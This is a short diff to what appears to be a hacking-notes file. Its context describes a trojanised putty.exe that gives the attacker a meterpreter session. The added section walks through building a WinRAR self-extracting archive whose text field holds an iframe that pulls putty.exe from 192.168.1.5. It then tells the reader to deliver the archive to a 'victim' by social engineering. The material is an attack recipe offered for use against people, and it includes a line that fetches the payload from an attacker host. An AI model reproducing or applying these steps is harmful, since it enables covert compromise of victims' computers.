@@ -36,3 +36,18 @@ set lport <port-no.>
 exploit
 
 When the victim clicks the putty.exe file which will appear as similar to original putty.exe and hence the victim will get trapped and we will get a meterpreter session.
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+WinRAR SFX Remote Code Execution Vulnerability ( run with winrar while unzipping without executing )
+
+patch putty.exe path in winrar utility tool. Right click on winrar . Select add to Archive option.
+Select Create SFX archive option.
+Select on Advanced and click on SFX options.
+Now Select Text and Icon option and type the path of putty.exe file with iframe tag follows.
+
+<iframe src=http://192.168.1.5/putty.exe></iframe>  Click on OK.
+
+send this Winrar file to victim PC using any Social Engineering Technique.
+
+https://www.hackingarticles.in/hack-remote-pc-using-winrar-sfx-remote-code-execution-vulnerability/
